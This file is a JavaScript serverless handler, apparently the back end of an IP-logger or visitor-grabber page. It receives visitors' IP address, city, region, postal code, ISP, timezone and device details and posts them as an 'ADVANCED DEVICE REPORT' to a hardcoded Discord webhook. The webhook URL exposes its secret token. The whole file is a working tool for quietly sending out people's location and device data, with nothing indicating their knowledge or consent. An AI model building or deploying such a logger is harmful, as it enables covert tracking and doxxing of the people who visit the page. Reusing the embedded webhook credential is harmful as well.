import axios from 'axios';

// ✅ Your new Discord webhook
const WEBHOOK = "https://discord.com/api/webhooks/1385400268514136165/lRS6bUpHEFgMG1pwhDQFrIBIyU2Z9_oLCApcZbX5XOEJgaRYdYR5pjkm6O1o7oWmzn6t";

function detectOS(userAgent) {
  userAgent = userAgent.toLowerCase();
  if (/windows phone/.test(userAgent)) return 'Windows Phone';
  if (/windows/.test(userAgent)) return 'Windows';
  if (/android/.test(userAgent)) return 'Android';
  if (/ipad|iphone|ipod/.test(userAgent)) return 'iOS';
  if (/mac os x/.test(userAgent)) return 'macOS';
  if (/linux/.test(userAgent)) return 'Linux';
  if (/cros/.test(userAgent)) return 'Chrome OS';
  return 'Unknown';
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).end('Method Not Allowed');
  }

  const data = req.body;
  const userAgent = req.headers['user-agent'] || '';
  data.os = detectOS(userAgent);

  const date = new Date().toLocaleString('en-US', { timeZone: 'Asia/Manila' });

  const message = {
    content: '**=== ADVANCED DEVICE REPORT ===**',
    embeds: [
      {
        color: 0x2f3136,
        title: '📡 Visitor Info',
        fields: [
          { name: 'IP', value: data.ip || 'Unknown' },
          { name: 'City', value: data.city || 'Unknown', inline: true },
          { name: 'Region', value: data.region || 'Unknown', inline: true },
          { name: 'Country', value: data.country || 'Unknown', inline: true },
          { name: 'ISP', value: data.isp || 'Unknown' },
          { name: 'Timezone', value: data.timezone || 'Unknown', inline: true },
          { name: 'Postal', value: data.postal || 'Unknown', inline: true }
        ],
        footer: { text: `Time: ${date}` }
      },
      {
        color: 0x2f3136,
        title: '🖥️ Device Info',
        fields: [
          { name: 'OS', value: data.os || 'Unknown', inline: true },
          { name: 'Mobile', value: String(data.mobile), inline: true },
          { name: 'Browser', value: data.browser || 'Unknown', inline: true },
          { name: 'Memory', value: `${data.memory} GB`, inline: true },
          { name: 'Battery', value: `${data.battery}%`, inline: true },
          { name: 'Charging', value: String(data.charging), inline: true },
          { name: 'Screen', value: data.screen, inline: true },
          { name: 'Viewport', value: data.viewport, inline: true }
        ]
      }
    ]
  };

  try {
    await axios.post(WEBHOOK, message);
    console.log('[+] Sent log to Discord');
    return res.status(200).json({ success: true });
  } catch (err) {
    console.error('[!] Failed to send to Discord:', err.message);
    return res.status(500).json({ success: false });
  }
}
